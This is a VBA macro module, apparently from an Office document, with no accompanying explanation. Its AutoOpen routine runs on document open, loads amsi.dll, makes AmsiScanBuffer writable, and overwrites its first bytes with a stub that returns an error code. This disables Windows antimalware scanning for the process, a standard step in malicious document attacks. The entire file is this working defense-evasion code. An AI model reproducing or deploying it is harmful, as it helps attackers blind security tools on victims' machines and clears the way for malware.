Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)


Sub AutoOpen()

    Dim AmsiDLL As LongPtr
    Dim AmsiScanBufferAddr As LongPtr
    Dim result As Long
    Dim ArrayPointer As LongPtr


    #If Win64 Then
        Dim MyByteArray(6) As Byte
        MyByteArray(0) = 184 ' 0xB8
        MyByteArray(1) = 87  ' 0x57
        MyByteArray(2) = 0   ' 0x00
        MyByteArray(3) = 7   ' 0x07
        MyByteArray(4) = 128 ' 0x80
        MyByteArray(5) = 195 ' 0xC3
    #Else
        Dim MyByteArray(8) As Byte
        MyByteArray(0) = 184 ' 0xB8
        MyByteArray(1) = 87  ' 0x57
        MyByteArray(2) = 0   ' 0x00
        MyByteArray(3) = 7   ' 0x07
        MyByteArray(4) = 128 ' 0x80
        MyByteArray(5) = 194 ' 0xC2
        MyByteArray(6) = 24  ' 0x18
        MyByteArray(7) = 0 ' 0x00
    #End If
    

    AmsiDLL = LoadLibrary("amsi.dll")
    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
    
    #If Win64 Then
        result = VirtualProtect(ByVal AmsiScanBufferAddr, 6, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        CopyMem ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
    #Else
        result = VirtualProtect(ByVal AmsiScanBufferAddr, 8, 64, 0)
        ArrayPointer = VarPtr(MyByteArray(0))
        CopyMem ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 8
    #End If

End Sub

